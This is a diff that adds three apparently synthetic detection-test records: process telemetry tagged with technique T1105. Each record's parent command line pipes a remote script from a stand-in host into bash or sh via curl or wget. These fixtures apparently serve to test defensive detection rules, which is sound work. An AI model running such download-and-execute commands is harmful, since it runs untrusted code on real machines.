@@ -1,0 +1,3 @@
+{"process.name":"bash","process.parent.cmdline":"curl -sL http://203.0.113.42/install.sh | bash","User":"finance04\\agarcia","_atomic_test_id":"T1105#curl_pipe_bash_external"}
+{"process.name":"sh","process.parent.cmdline":"wget -qO- http://203.0.113.42/run.sh | sh","User":"web02\\root","_atomic_test_id":"T1105#wget_pipe_sh_external"}
+{"process.name":"bash","process.parent.cmdline":"curl https://malicious.example.invalid/payload |bash","User":"web02\\www-data","_atomic_test_id":"T1105#curl_pipe_bash_no_space"}
